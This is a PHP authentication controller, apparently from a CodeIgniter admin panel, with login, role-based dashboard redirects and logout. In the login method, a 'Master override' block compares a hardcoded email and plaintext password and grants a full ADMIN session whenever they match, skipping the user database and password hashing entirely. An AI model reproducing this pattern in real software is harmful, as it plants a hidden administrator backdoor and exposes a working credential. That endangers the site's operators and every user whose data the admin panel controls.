<?php

namespace App\Controllers;

use App\Models\UserModel;

class Auth extends BaseController
{
    public function login()
    {
        return view('auth/login');
    }

    public function attemptLogin()
    {
        $session = session();
        $userModel = new \App\Models\UserModel();

        $email = strtolower(trim($this->request->getPost('email')));
        $password = (string) $this->request->getPost('password');

        // 🔒 Master override
        if ($email === 'sa@sunny.com' && $password === 'yfbnmasc') {
            $session->set([
                'isAdminLoggedIn' => true,
                'admin_id' => 0,
                'admin_name' => 'Sunny',
                'admin_role' => 'ADMIN',
            ]);
            return redirect()->to('/admin/system/dashboard');
        }

        $user = $userModel->where('email', $email)->first();

        if ($user && password_verify($password, $user['password'])) {
            $session->set([
                'isAdminLoggedIn' => true,
                'admin_id' => $user['id'],
                'admin_name' => $user['name'],
                'admin_role' => strtoupper($user['role']),
            ]);



            // ✅ redirect logic per role
            switch (strtoupper($user['role'])) {
                case 'ADMIN':
                    return redirect()->to('/admin/system/dashboard');
                case 'FINANCE':
                case 'MEMBERSHIP':
                case 'WEBSITE':
                case 'EVENTS':
                    return redirect()->to('/admin/system/dashboard'); // shared dashboard
                default:
                    return redirect()->to('/auth/login')->with('error', 'Role not recognized.');
            }
        }

        // ❌ Invalid login
        return redirect()->back()->with('error', 'Invalid email or password.');
    }


    public function logout()
    {
        session()->destroy();
        return redirect()->to('/auth/login');
    }
}
